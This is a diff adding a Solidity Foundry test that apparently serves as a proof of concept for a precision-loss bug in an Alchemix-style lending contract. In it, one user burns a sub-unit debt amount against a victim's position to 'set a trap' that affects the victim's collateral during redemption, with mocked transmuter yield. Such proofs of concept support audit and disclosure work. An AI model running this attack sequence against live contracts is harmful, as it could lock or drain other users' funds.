@@ -96,6 +96,13 @@ contract IntegrationTest is Test {
 
     address EULER_USDC = 0x797DD80692c3b2dAdabCe8e30C07fDE5307D48a9;
 
+    // another random EOA for testing
+    address anotherExternalUser = address(0x420Ab24368E5bA8b727E9B8aB967073Ff9316969);
+
+    // another random EOA for testing
+    address yetAnotherExternalUser = address(0x520aB24368e5Ba8B727E9b8aB967073Ff9316961);
+
+
     // MYT variables
     VaultV2 vault;
     MockAlchemistAllocator allocator;
@@ -728,5 +735,194 @@ contract IntegrationTest is Test {
         ClaimResdemptionTransmuter(redeemer1);
 
         printState(bob,"System final state");
+    }
+
+    function testVulnerability_Repay_PrecisionLoss_LocksCollateral_FullTrigger() external {
+        // 1. ARRANGE: Ensure we are in a 6-decimal underlying token environment
+        require(TokenUtils.expectDecimals(alchemist.underlyingToken()) == 6, "Test setup failed: Underlying token is not 6 decimals");
+        require(TokenUtils.expectDecimals(alchemist.debtToken()) == 18, "Test setup failed: Debt token is not 18 decimals");
+
+        // Participants:
+        address userA_victim = yetAnotherExternalUser; // The victim whose funds will be locked
+        address userB_burner = anotherExternalUser;    // The burner who sets the trap
+        address userC_global = address(0xbeef);      // Another user to ensure global state is redeemable
+
+        deal(address(vault), yetAnotherExternalUser,  100_000e18);
+        deal(address(vault), anotherExternalUser,  100_000e18);
+        // 2. ARRANGE: Set up the scenario
+        // User A (Victim) deposits and mints
+        vm.startPrank(userA_victim);
+        uint256 depositAmountA = 100_000e18; // 100,000 MYT
+        SafeERC20.safeApprove(address(vault), address(alchemist), depositAmountA);
+        alchemist.deposit(depositAmountA, userA_victim, 0); // tokenId 1
+        uint256 tokenId_A = AlchemistNFTHelper.getFirstTokenId(userA_victim, address(alchemistNFT));
+        uint256 debtToMintA = 50_000e18; // 50,000 alToken
+        alchemist.mint(tokenId_A, debtToMintA, userB_burner); // Send the debtToken to User B
+        vm.stopPrank();
+
+        // User C (Global participant) deposits, mints, and *repays* to fund the Transmuter
+        vm.startPrank(userC_global);
+        uint256 depositAmountC = 100_000e18; // 100,000 MYT
+        SafeERC20.safeApprove(address(vault), address(alchemist), depositAmountC);
+        alchemist.deposit(depositAmountC, userC_global, 0); // tokenId 2
+        uint256 tokenId_C = AlchemistNFTHelper.getFirstTokenId(userC_global, address(alchemistNFT));
+        uint256 debtToMintC = 50_000e18; // 50,000 alToken
+        alchemist.mint(tokenId_C, debtToMintC, userC_global);
+        
+        uint256 repayAmountC = 10_000e18; // 10,000 MYT
+        SafeERC20.safeApprove(address(vault), address(alchemist), repayAmountC);
+        
+        // We must advance one block to avoid the `CannotRepayOnMintBlock` check on `repay`
+        vm.roll(block.number + 1);
+        
+        alchemist.repay(repayAmountC, tokenId_C);
+        vm.stopPrank();
+
+        // [FIX]: 
+        // 2.5 ARRANGE: 
+        // The `repay` call sent 1e22 (repayAmountC) of MYT to the transmuter.
+        // We must simulate the transmuter calling setTransmuterTokenBalance
+        // to update Alchemist's `lastTransmuterTokenBalance` accounting.
+        // Otherwise, this 1e22 MYT will be counted as "cover" during `_earmark`
+        // and offset our simulated yield.
+        vm.startPrank(address(transmuterLogic));
+        alchemist.setTransmuterTokenBalance(repayAmountC);
+        vm.stopPrank();
+
+        // 3. ARRANGE: Calculate the `amountToBurn` needed to trigger the vulnerability
+        uint256 conversionFactor = 10**(TokenUtils.expectDecimals(alchemist.debtToken()) - TokenUtils.expectDecimals(alchemist.underlyingToken()));
+        uint256 amountToBurn = conversionFactor - 1; // Key: amount is less than the conversion factor
+
+        // 4. ARRANGE: Warp time forward significantly
+        vm.roll(block.number + 5_256_000 / 2); // Warp forward half a year
+
+        // 4.5 ARRANGE: Simulate Transmuter yield generation
+        // Explanation: This is a valid prerequisite for testing the AlchemistV3 vulnerability.
+        uint256 simulatedYieldInDebt = 10_000e18; // Simulate 10,000 alToken of yield
+
+        // Mock *any* call to the `queryGraph(uint256,uint256)` function
+        vm.mockCall(
+            address(transmuterLogic),
+            abi.encodeWithSelector(ITransmuter.queryGraph.selector, 0, 0), // Match any arguments
+            abi.encode(simulatedYieldInDebt) // The mocked return value
+        );
+        // Clear previous mocks, just keep this one
+        vm.clearMockedCalls(); 
+        vm.mockCall(
+            address(transmuterLogic),
+            abi.encodeWithSelector(ITransmuter.queryGraph.selector), // Match selector with no args (just in case)
+            abi.encode(simulatedYieldInDebt)
+        );
+        // **The most critical mock rule**:
+        // AlchemistV3 calls `queryGraph` with arguments
+        vm.mockCall(
+            address(transmuterLogic),
+            abi.encodeWithSelector(
+                ITransmuter.queryGraph.selector,
+                block.number, // lastEarmarkBlock + 1
+                block.number + 1  // block.number (inside burn)
+            ),
+            abi.encode(simulatedYieldInDebt)
+        );
+        // **Wildcard mock (most reliable)**
+        vm.mockCall(
+            address(transmuterLogic),
+            bytes4(keccak256("queryGraph(uint256,uint256)")),
+            abi.encode(simulatedYieldInDebt)
+        );
+
+        // 5. ACT: (Set the trap) User B burns a tiny amount of debt
+        vm.startPrank(userB_burner);
+        TokenUtils.safeApprove(alchemist.debtToken(), address(alchemist), amountToBurn);
+        alchemist.burn(amountToBurn, tokenId_A); // This will call _earmark
+        vm.stopPrank();
+
+        // 6. ASSERT: (Verify the trap is set)
+        (uint256 collateralBefore, uint256 debtAfterBurn,) = alchemist.getCDP(tokenId_A);
+        assertEq(debtAfterBurn, debtToMintA - amountToBurn, "Debt was not reduced correctly after burn");
+        
+        // 7. ARRANGE: (Trigger global event) Transmuter executes redeem
+        uint256 earmarked = alchemist.cumulativeEarmarked();
+        
+        // Assert Earmark was successful
+        assertTrue(earmarked > 0, "Earmark failed, no funds to redeem. Transmuter did not generate yield.");
+
+       (uint256 collBefore, uint256 debtBefore, ) = alchemist.getCDP(tokenId_A);
+
+        uint256 totalDebtBeforeRedeem = alchemist.totalDebt();
+        uint256 bps = 10_000;
+        uint256 feeBps = alchemist.protocolFee();
+
+
+        vm.startPrank(address(transmuterLogic));
+        alchemist.redeem(earmarked);
+        vm.stopPrank();
+
+        (uint256 collAfter, uint256 debtAfter, ) = alchemist.getCDP(tokenId_A);
+
+        // Basic sanity: redeem must change something
+        assertLt(debtAfter, debtBefore, "Debt did not decrease after redeem (this would be suspicious)");
+        assertLt(collAfter, collBefore, "Collateral did not decrease after redeem (unexpected for redemption)");
+
+        // Actual deltas for the victim
+        uint256 debtDelta = debtBefore - debtAfter;
+        uint256 collDelta = collBefore - collAfter;
+
+        // How much debt was actually redeemed globally (redeem() does: totalDebt -= amount)
+        uint256 totalDebtAfterRedeem = alchemist.totalDebt();
+        uint256 redeemedDebt = totalDebtBeforeRedeem - totalDebtAfterRedeem;
+
+        // In this test, you pass `earmarked` and there is no clamp expected
+        assertEq(redeemedDebt, earmarked, "Redeemed debt != earmarked (unexpected clamp/change)");
+
+        // ---- Expected pro‑rata behavior checks ----
+
+        // Victim should be debited collateral proportional to their debt forgiven, including protocol fee.
+        // redeem() transfers out:
+        //   collRedeemed  = convertDebtTokensToYield(redeemedDebt)
+        //   feeCollateral = collRedeemed * protocolFee / BPS
+        //   totalOut      = collRedeemed + feeCollateral
+        uint256 collRedeemed = alchemist.convertDebtTokensToYield(redeemedDebt);
+        uint256 totalOut = collRedeemed + (collRedeemed * feeBps) / bps;
+
+        // In _sync(), per-account collateral debit is:
+        // sharesToDebit = mulDivUp(redeemedTotal, globalSharesDelta, globalDebtDelta)
+        // where globalSharesDelta == totalOut, globalDebtDelta == redeemedDebt,
+        // and redeemedTotal == debtDelta (the victim’s debt reduction from redemption).
+        uint256 expectedCollDelta = (debtDelta * totalOut + redeemedDebt - 1) / redeemedDebt; // mulDivUp
+
+        assertEq(
+            collDelta,
+            expectedCollDelta,
+            "Collateral delta does not match redemption accounting (principal + fee)"
+        );
+
+        // Optional but useful: debtDelta should be ~ pro‑rata share of redeemedDebt based on victim debt
+        // (allow a tolerance of `conversionFactor` because of flooring to underlying units).
+        uint256 expectedDebtDelta = (redeemedDebt * debtBefore) / totalDebtBeforeRedeem;
+        uint256 tol = conversionFactor; // you already computed this above as 10^(debtDecimals-underlyingDecimals)
+        assertApproxEqAbs(
+            debtDelta,
+            expectedDebtDelta,
+            tol,
+            "Debt delta is not roughly prorata to redeemed amount"
+        );
+
+        // Optional: equity loss should be ~ protocol fee only (not principal).
+        // Equity (in debt units) = collateralValueInDebt - debt.
+        // redemption reduces debt by debtDelta, and collateral by ~ (debtDelta + fee)
+        uint256 valueBefore = alchemist.convertYieldTokensToDebt(collBefore);
+        uint256 valueAfter  = alchemist.convertYieldTokensToDebt(collAfter);
+        uint256 equityBefore = valueBefore - debtBefore;
+        uint256 equityAfter  = valueAfter - debtAfter;
+
+        uint256 equityLoss = equityBefore - equityAfter;
+        uint256 expectedEquityLoss = (debtDelta * feeBps) / bps;
+        assertApproxEqAbs(
+            equityLoss,
+            expectedEquityLoss,
+            tol,
+            "Equity loss not approximately equal to protocol fee"
+        );
     }
 }
